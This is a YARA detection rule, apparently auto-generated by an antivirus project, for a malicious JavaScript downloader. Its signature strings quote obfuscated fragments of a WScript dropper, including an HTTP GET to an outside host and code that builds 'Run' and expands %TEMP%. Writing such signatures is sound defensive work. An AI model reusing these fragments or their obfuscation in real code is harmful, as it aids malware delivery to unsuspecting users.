rule sig_20160428_e5b9122a6f6951579a61f57d32df7797 {
  meta:
    description = "datamaliciousorder - file 20160428_e5b9122a6f6951579a61f57d32df7797.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cf0e1e2f93efc12f42a28bbb25ac0e2766c08e3414eb960c3ac503e5d6669f56"

  strings:
    $s1  = "RogMnrYwiQpvZcwVfjAjs[BxpGplPgfBhkAjnSwoUmk](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function QysGbtTanJubScvSfoBpn(FvcDboVqlRomPhcOveWhr){JgbHixUnwRdvJdbEcmJvc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function XjlSknEqwGwfEtvFbnVxb() {return JgbHixUnwRdvJdbEcmJvc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function QysGbtTanJubScvSfoBpn(FvcDboVqlRomPhcOveWhr){JgbHixUnwRdvJdbEcmJvc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var MinKagYwnQhnFloJnvGcd = this[\"WScript\"];" fullword ascii
    $s6  = "function XjlSknEqwGwfEtvFbnVxb() {return JgbHixUnwRdvJdbEcmJvc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s7  = "if (RogMnrYwiQpvZcwVfjAjs[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function VegQncRgiZtgNumPtsBqm(){return IxsLxtSgcYnlOlpEtkLvn + \"\";};" fullword ascii
    $s9  = "return SszZkvOwuQjkAfyLncDyy - PcaWawVnrSrtEsyHdtAlf;};" fullword ascii
    $s10 = "var JgbHixUnwRdvJdbEcmJvc = function UeiViaWtrKvrFmdFxrTxb() {return MinKagYwnQhnFloJnvGcd[YkeEayTmiNqeVhjMtsAca](\"WScript\"+\"" ascii
    $s11 = "function HtkAfuOrbLxpEnsWubDjg(SszZkvOwuQjkAfyLncDyy, PcaWawVnrSrtEsyHdtAlf){EvzBweCtoTjxWfnVziUes = EvzBweCtoTjxWfnVziUes * 1; " ascii
    $s12 = "function BlsBkwUjvHtyPbeUmnAes() {return ((RocCboJjeZebGbrVglFtq == true) && (RocCboJjeZebGbrVglFtq == AloDjbVzpTudJibTrnNtl)) ?" ascii
    $s13 = "function BlsBkwUjvHtyPbeUmnAes() {return ((RocCboJjeZebGbrVglFtq == true) && (RocCboJjeZebGbrVglFtq == AloDjbVzpTudJibTrnNtl)) ?" ascii
    $s14 = "return HtkAfuOrbLxpEnsWubDjg(1 == 1 ? OwhVcfDhsXrmTekIsvVkk : 0, 1 == 1 ? ZohBzfUixCgwVlwKeyZrq : 0);" fullword ascii
    $s15 = "var JgbHixUnwRdvJdbEcmJvc = function UeiViaWtrKvrFmdFxrTxb() {return MinKagYwnQhnFloJnvGcd[YkeEayTmiNqeVhjMtsAca](\"WScript\"+\"" ascii
    $s16 = "function HtkAfuOrbLxpEnsWubDjg(SszZkvOwuQjkAfyLncDyy, PcaWawVnrSrtEsyHdtAlf){EvzBweCtoTjxWfnVziUes = EvzBweCtoTjxWfnVziUes * 1; " ascii
    $s17 = "function EkpVrfKfnQfaTphFtoUdk(YfwZzjQshXiqVmtRrzNqg) {var OqzRgxMdbZspPeoAqyLux = (1, 2, 3, 4, 5, YfwZzjQshXiqVmtRrzNqg); retur" ascii
    $s18 = "function UcsUewUpoPijNctLbcZdg(){return 23;};" fullword ascii
    $s19 = "YveMqbKkaKgzGxePnxMqg = true;" fullword ascii
    $s20 = "function EkpVrfKfnQfaTphFtoUdk(YfwZzjQshXiqVmtRrzNqg) {var OqzRgxMdbZspPeoAqyLux = (1, 2, 3, 4, 5, YfwZzjQshXiqVmtRrzNqg); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}